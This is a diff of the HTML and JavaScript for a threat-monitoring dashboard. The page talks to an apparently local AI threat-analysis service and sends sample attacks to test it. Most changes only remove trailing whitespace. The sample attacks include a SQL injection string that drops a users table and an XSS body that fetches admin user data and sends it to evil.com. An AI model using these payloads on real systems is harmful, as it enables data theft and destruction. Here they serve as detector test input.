@@ -23,12 +23,12 @@
             letter-spacing: 0.05em;
         }
 
-        .threat-status.connected { 
-            background: var(--normal); 
+        .threat-status.connected {
+            background: var(--normal);
             color: var(--bg);
         }
-        .threat-status.disconnected { 
-            background: var(--critical); 
+        .threat-status.disconnected {
+            background: var(--critical);
             color: var(--hi-silver);
         }
 
@@ -219,31 +219,31 @@
             confidence: 0,
             processing: 0
         };
-        
+
         let isTestAttack = false;
 
         function connect() {
             ws = new WebSocket('ws://localhost:18002/ws');
-            
+
             ws.onopen = () => {
                 console.log('Connected to AI Service');
                 document.getElementById('status').className = 'threat-status connected';
                 document.getElementById('status').textContent = 'CONNECTED';
             };
-            
+
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
                 if (data.type === 'threat_analysis') {
                     updateAnalysis(data);
                 }
             };
-            
+
             ws.onerror = (error) => {
                 console.error('WebSocket error:', error);
                 document.getElementById('status').className = 'threat-status disconnected';
                 document.getElementById('status').textContent = 'DISCONNECTED';
             };
-            
+
             ws.onclose = () => {
                 document.getElementById('status').className = 'threat-status disconnected';
                 document.getElementById('status').textContent = 'RECONNECTING...';
@@ -253,43 +253,43 @@
 
         function updateAnalysis(messageData) {
             const data = messageData.data || {};
-            
+
             metrics.total++;
-            
+
             if (isTestAttack) {
                 metrics.testAttacks++;
                 isTestAttack = false;
             } else if ((data.threat_score || 0) > 0.7) {
                 metrics.blocked++;
             }
-            
+
             const confidence = data.confidence || 0;
             const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
-            
+
             if (confidence > 0) {
                 metrics.confidence = ((metrics.confidence * (metrics.total - 1) + confidence) / metrics.total);
             }
             if (processingTime > 0) {
                 metrics.processing = ((metrics.processing * (metrics.total - 1) + processingTime) / metrics.total);
             }
-            
+
             document.getElementById('totalAnalyzed').textContent = metrics.total;
             document.getElementById('threatsBlocked').textContent = metrics.testAttacks + '/' + metrics.blocked;
             document.getElementById('avgConfidence').textContent = (metrics.confidence * 100).toFixed(1) + '%';
             document.getElementById('avgProcessing').textContent = metrics.processing.toFixed(0) + 'ms';
-            
+
             const threatType = data.threat_type || 'none';
             const threatScore = ((data.threat_score || 0) * 100).toFixed(1);
             const action = data.recommended_action || 'monitor';
-            
-            document.getElementById('currentStatus').innerHTML = 
+
+            document.getElementById('currentStatus').innerHTML =
                 '<div style="color: var(--hi-silver); font-weight: 500; margin-bottom: 4px;">' + threatType.toUpperCase() + '</div>' +
                 '<div style="color: var(--txt-muted); font-size: 12px;">Score: ' + threatScore + '% | Action: ' + action.toUpperCase() + '</div>';
         }
 
         async function sendAttack(type) {
             isTestAttack = true;
-            
+
             const attacks = {
                 sql: {
                     query: "id=1' OR '1'='1; DROP TABLE users;--",
@@ -300,7 +300,7 @@
                 xss: {
                     query: "alert('XSS')",
                     path: "/comment",
-                    method: "POST", 
+                    method: "POST",
                     body: "fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))"
                 },
                 path: {
@@ -334,10 +334,10 @@
                     body: ""
                 }
             };
-            
+
             const attack = attacks[type];
             if (!attack) return;
-            
+
             try {
                 await fetch('http://localhost:18002/analyze', {
                     method: 'POST',
